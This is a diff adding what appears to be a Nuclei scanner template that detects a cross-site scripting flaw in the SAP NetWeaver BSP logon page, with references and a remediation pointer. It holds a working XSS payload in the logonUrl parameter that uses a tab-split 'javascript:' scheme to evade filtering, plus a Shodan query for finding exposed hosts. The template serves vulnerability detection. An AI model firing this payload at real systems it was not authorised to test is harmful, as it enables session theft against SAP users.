@@ -1,0 +1,43 @@
+id: sap-gui-xss
+
+info:
+  name: SAP NetWeaver BSP Logon Page Cross Site Scripting
+  author: haones, MrL872
+  severity: high
+  description: SAP NetWeaver BSP 620 to 730 versions suffer from a cross site scripting vulnerability via the logon page.
+  remediation: Solution to this issue is given in the 1450270 security note.
+  reference:
+    http://dsecrg.com/pages/vul/show.php?id=310
+    http://www.sdn.sap.com/irj/sdn/index?rid=/webcontent/uuid/c05604f6-4eb3-2d10-eea7-ceb666083a6a
+    https://service.sap.com/sap/support/notes/1450270
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"SAP"
+  tags: SAP,BSP,xss
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/sap(bD1ydSZjPTAwMA==)/public/bsp/sap/system_public/logon.htm?logonUrl=javascrip%09T:alert(document.domain)"
+
+    host-redirects: true
+    max-redirects: 2
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'javascrip&#x9;T&#x3a;alert&#x28;document.domain&#x29;'
+
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - 'text/html'
+
+      - type: status
+        status:
+          - 200
